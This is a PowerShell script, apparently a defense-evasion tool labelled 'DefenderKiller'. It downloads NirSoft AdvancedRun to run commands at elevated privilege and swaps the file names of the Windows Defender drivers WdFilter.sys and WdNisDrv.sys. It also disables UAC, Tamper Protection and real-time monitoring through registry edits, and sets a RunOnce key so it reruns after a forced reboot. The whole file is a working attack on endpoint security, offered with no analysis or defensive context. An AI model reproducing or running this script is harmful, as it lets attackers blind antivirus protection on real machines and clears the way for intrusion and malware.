# =======================
# Download and Extract AdvancedRun
# =======================
$advRunDir = "C:\ProgramData\AdvancedRun"
$global:advRunPath = Join-Path $advRunDir "AdvancedRun.exe"

if (-not (Test-Path $global:advRunPath)) {
    Write-Host "[*] AdvancedRun executable not found. Downloading..."
    if (-not (Test-Path $advRunDir)) {
        New-Item -Path $advRunDir -ItemType Directory -Force | Out-Null
    }
    $zipUrl = "https://www.nirsoft.net/utils/advancedrun-x64.zip"
    $zipFile = Join-Path $env:TEMP "advancedrun-x64.zip"
    Write-Host "[*] Downloading AdvancedRun zip from $zipUrl..."
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile
    Write-Host "[*] Extracting AdvancedRun..."
    Expand-Archive -Path $zipFile -DestinationPath $advRunDir -Force
    Remove-Item $zipFile -Force
    Write-Host "[*] AdvancedRun downloaded and extracted to $advRunDir"
}

# =======================
# AdvancedRun Helper Function
# =======================
function Invoke-ElevatedCommand {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Command
    )
    $arguments = '/RunAs 8 /RunMode 4 /CommandLine "' + $Command + '" /Run'
    Write-Host "[*] Executing elevated command via AdvancedRun:"
    Write-Host "    $arguments"
    Start-Process -FilePath $global:advRunPath -ArgumentList $arguments -Wait
}

# =======================
# Disable UAC Function
# =======================
function Disable-UAC {
    $cmd = "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0 -Force; exit"
    Write-Host "[*] Disabling UAC (EnableLUA=0)..."
    Invoke-ElevatedCommand -Command $cmd
}

# =======================
# Driver Check and Path Detection
# =======================
function Get-WdDriversPath {
    $possiblePaths = @(
        "$env:windir\System32\drivers",
        "$env:windir\System32\drivers\wd"
    )

    foreach ($path in $possiblePaths) {
        $wdFilter = Join-Path $path "WdFilter.sys"
        $wdNisDrv = Join-Path $path "WdNisDrv.sys"
        if ((Test-Path $wdFilter) -and (Test-Path $wdNisDrv)) {
            Write-Host "[*] Found Defender driver files in: $path"
            return $path
        }
    }
    Write-Host "[!] Could not find WdFilter.sys and WdNisDrv.sys in any known path."
    return $null
}

# =======================
# Driver Swap Function
# =======================
function Swap-WdDrivers {
    param(
        [Parameter(Mandatory=$true)]
        [string]$driversDir
    )

    $fileWdFilter = Join-Path $driversDir "WdFilter.sys"
    $fileWdNisDrv = Join-Path $driversDir "WdNisDrv.sys"

    Write-Host "[*] Swapping driver names using elevated AdvancedRun..."
    $cmd = "Rename-Item -Path '$fileWdFilter' -NewName 'WdFilter_tmp.sys' -Force; " +
           "Rename-Item -Path '$fileWdNisDrv' -NewName 'WdFilter.sys' -Force; " +
           "Rename-Item -Path '$driversDir\WdFilter_tmp.sys' -NewName 'WdNisDrv.sys' -Force; exit"
    
    Invoke-ElevatedCommand -Command $cmd
    Write-Host "[*] Driver names swapped successfully."
}

# =======================
# Registry Modification Functions
# =======================
function Disable-TamperProtection {
    $cmd = "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name 'TamperProtection' -Value 4 -Force; " +
           "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name 'TamperProtectionSource' -Value 4 -Force; exit"
    Write-Host "[*] Disabling Tamper Protection..."
    Invoke-ElevatedCommand -Command $cmd
}

function Disable-AV_MDE {
    $cmd = "New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Force | Out-Null; " +
           "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -Force; exit"
    Write-Host "[*] Disabling AV/MDE..."
    Invoke-ElevatedCommand -Command $cmd
}

# =======================
# RunOnce Key Helper
# =======================
function Set-RunOnceKey {
    $runOncePath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
    $valueName   = "DefenderKiller"
    $scriptPath  = $MyInvocation.MyCommand.Path
    if (-not $scriptPath) { $scriptPath = $PSCommandPath }

    $runOnceCommand = "powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""

    Write-Host "[*] Setting RunOnce key for post-reboot: $runOnceCommand"
    Set-ItemProperty -Path $runOncePath -Name $valueName -Value $runOnceCommand
}

# =======================
# Main Execution Logic
# =======================
$flagFile = "$env:TEMP\DriverSwapCompleted.txt"

if (-not (Test-Path $flagFile)) {
    Write-Host "=== Step 1: Detect and Swap WdFilter and WdNisDrv Driver Names ==="
    $driversDir = Get-WdDriversPath
    if (-not $driversDir) {
        Write-Host "[!] Driver files not found. Aborting."
        exit 1
    }
    Swap-WdDrivers -driversDir $driversDir

    Disable-UAC

    New-Item -Path $flagFile -ItemType File -Force | Out-Null

    Set-RunOnceKey

    Write-Host "[*] Swap completed, UAC disabled. Restarting computer..."
    Restart-Computer -Force
    exit
}
else {
    Write-Host "[*] Detected post-reboot state. Proceeding with registry modifications..."

    Write-Host "=== Step 2: Disable Tamper Protection ==="
    Disable-TamperProtection

    Write-Host "=== Step 3: Disable AV/MDE ==="
    Disable-AV_MDE

    Remove-Item $flagFile -Force

    Write-Host "[*] Registry modifications complete. UAC is now disabled system-wide."
}
